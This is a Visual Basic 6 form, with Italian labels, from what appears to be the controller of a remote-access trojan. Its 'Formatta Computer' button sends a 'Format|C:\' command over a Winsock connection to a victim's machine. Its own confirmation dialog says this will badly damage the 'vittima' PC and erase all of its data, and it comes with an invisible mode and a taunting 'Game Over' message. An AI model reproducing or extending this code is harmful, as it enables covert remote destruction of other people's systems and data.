VERSION 5.00
Begin VB.Form Form23 
   Caption         =   "Format C:\"
   ClientHeight    =   7425
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   4800
   LinkTopic       =   "Form23"
   ScaleHeight     =   7425
   ScaleWidth      =   4800
   StartUpPosition =   3  'Windows Default
   Begin VB.CheckBox Check2 
      Caption         =   "Messaggio Personale"
      Height          =   255
      Left            =   1200
      TabIndex        =   9
      Top             =   6360
      Width           =   2415
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   240
      TabIndex        =   8
      Text            =   "Game Over ti ho formattato il pc -xXManuddXx"
      Top             =   6840
      Width           =   4215
   End
   Begin VB.CommandButton Command1 
      Caption         =   "?"
      Height          =   255
      Left            =   2040
      TabIndex        =   7
      Top             =   5760
      Width           =   255
   End
   Begin VB.OptionButton Option2 
      Caption         =   "Visibile"
      Height          =   495
      Left            =   2760
      TabIndex        =   6
      Top             =   5640
      Width           =   1335
   End
   Begin VB.OptionButton Option1 
      Caption         =   "Invisibile"
      Height          =   495
      Left            =   600
      TabIndex        =   5
      Top             =   5640
      Width           =   1335
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   1320
      TabIndex        =   3
      Text            =   "C:\"
      Top             =   4800
      Width           =   2895
   End
   Begin VB.CheckBox Check1 
      Caption         =   "Opzioni Avanzate"
      Height          =   255
      Left            =   1320
      TabIndex        =   1
      Top             =   4200
      Width           =   1815
   End
   Begin VB.CommandButton Command2 
      BackColor       =   &H00FFFFFF&
      Caption         =   "Formatta Computer"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   13.5
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   3975
      Left            =   240
      MaskColor       =   &H000000FF&
      Picture         =   "Form23.frx":0000
      Style           =   1  'Graphical
      TabIndex        =   0
      Top             =   120
      UseMaskColor    =   -1  'True
      Width           =   4335
   End
   Begin VB.Label Label2 
      AutoSize        =   -1  'True
      Caption         =   "Visibilità"
      Height          =   195
      Left            =   1800
      TabIndex        =   4
      Top             =   5280
      Width           =   555
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      Caption         =   "Cambia Drive"
      Height          =   195
      Left            =   240
      TabIndex        =   2
      Top             =   4800
      Width           =   945
   End
End
Attribute VB_Name = "Form23"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command2_Click()
Dim answer As String

answer = MsgBox("Vuoi Veramente formattare il pc alla vittima se lo fara il suo sistema operativo verra danneggiato gravemente e perderà tutti i dati vuoi veramente farlo?", vbExclamation + vbYesNo, "Add Confirm")
If answer = vbYes Then
If Option1.Value = True Then
If Check1.Value = False Then
Form1.Winsock1(Form1.Label14.Caption).SendData "Format|" & Text1.Text

End If
End If
Else
MsgBox "Scelta Saggia :)", vbInformation
End If
End Sub

Private Sub Form_Load()

End Sub
